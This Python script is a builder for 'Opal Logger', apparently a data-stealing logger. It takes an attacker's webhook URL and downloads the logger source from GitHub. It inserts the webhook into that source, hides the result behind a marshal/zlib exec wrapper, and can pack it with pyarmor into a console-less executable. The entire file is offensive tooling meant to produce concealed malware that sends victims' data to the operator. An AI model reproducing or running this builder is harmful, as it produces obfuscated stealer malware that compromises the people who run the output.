import marshal
import zlib
import requests
from pystyle import *
import os
import time
import shutil
os.system(f'cls & title Opal Logger Builder!')
Write.Print(Center.XCenter("""
                                         ╔═╗┌─┐┌─┐┬    ╦  ┌─┐┌─┐┌─┐┌─┐┬─┐
                                         ║ ║├─┘├─┤│    ║  │ ││ ┬│ ┬├┤ ├┬┘
                                         ╚═╝┴  ┴ ┴┴─┘  ╩═╝└─┘└─┘└─┘└─┘┴└─             
                                    Builder by Jose | Opal Logger by synthetic                                                                                  
\n"""), Colors.green_to_blue, interval=0)
webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_blue, interval=0.01)
r = requests.get(webhook)
if r.status_code == 200:
         Write.Print("Webhook Is Working\n",Colors.green_to_blue, interval=0.01) 
         time.sleep(1) 
else: 
    Write.Print("Webhook Is Not Working\n",Colors.green_to_blue, interval=0.01) 
    time.sleep(3) 
    exit()
name = Write.Input("Enter File Name:", Colors.green_to_blue, interval=0.01)
code = requests.get("https://raw.githubusercontent.com/Syntheticc/Opal-Logger/main/Opal.py")
with open(f"{name}.py", 'w', encoding='utf8') as f:
    f.write(code.text.replace("webhooker", webhook))
    f.write(code.text.replace("lollll", name))
Write.Print("Rawr Logger Was SucessFully Built\n",Colors.green_to_blue, interval=0.01)
prot = Write.Input(f"Adding Protection Now To {name} Also Click Enter To Contine",Colors.green_to_blue, interval=0.01)
with open(f'{name}.py') as fi:
    pro = fi.read()
    mar = marshal.dumps(pro)
    zlb = zlib.compress(mar)
    with open(f"{name}.py", 'w') as f:
        f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
    compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
    if compile == "y":
        os.system(f'pyarmor pack -e "--onefile --noconsole " {name}.py')
        os.remove(f'{name}.spec')
        Write.Print("Opal Logger Was SucessFully Complied In Dist Folder\n",Colors.green_to_blue, interval=0.01) 
        time.sleep(2)
        Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.green_to_blue, interval=0.01) 
        time.sleep(3)
        exit()
    elif compile == "n":
      Write.Print("Thank You For Using Opal Logger\n",Colors.green_to_blue, interval=0.01) 
      time.sleep(3)
      exit()
